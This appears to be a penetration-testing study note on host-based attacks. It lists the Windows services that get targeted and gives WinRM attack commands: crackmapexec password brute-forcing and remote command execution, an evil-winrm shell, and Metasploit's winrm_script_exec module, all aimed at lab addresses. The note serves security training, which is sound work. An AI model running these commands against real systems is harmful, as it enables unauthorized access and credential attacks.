# Table of Contents
1. Overview
2. Tools
	1. Windows
	2. Linux

---
# Overview
This phase is about exploiting what has been found in the [enumeration](../Assessment_Methodologies/Enumeration.md) phase.

Taking advantage of **inherent vulnerabilities** or **misconfigurations** in order to collect credentials and to expand your access and foothold into the network. All about gaining more power (privilege escalation) and expanding your access (lateral movement).
  
Host based attacks are against internal machines and not necessarily servers that are running services that are public accessible.

Type of Vulnerabilities
- Information Disclosure
- Buffer Overflows
- Remote Code Execution
- Privilege Escalation
- Denial of Service

---
# Tools
## Windows Attacks
### Services

| Service  | #Ports   | Description                            |
| -------- | -------- | -------------------------------------- |
| IIS      | 80/443   | webserver                              |
| WebDav   | 80/443   | Web Distributed Authoring & Versioning |
| SMB/CIFS | 445      | Network File sharing                   |
| RDP      | 3389     | Remote Desktop Protocol                |
| WinRM    | 5986/443 | Windows Remote Management Protocol     |

### Services
- [IIS WebDav](../../Services/IIS-WebDav.md)
- [SMB with PsExec](../../Services/SMB.md#PsExec)
- [RDP](../../Services/RDP.md)
- WinRM

#### Windows Remote Management (WinRM)
- 5985/5986 ports

##### crackmapexec
- brute force
- `crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
- `crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "whoami"`

##### evil-winrm.rb
- ruby script which gets shell access
- `evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.18.5`

##### msfconsonle
- use exploit/windows/winrm/winrm_script_exec
	- set rhosts addr
	- set force_vbs true
	- set username administrator
	- set password tinkerbell


---
## Linux Attacks
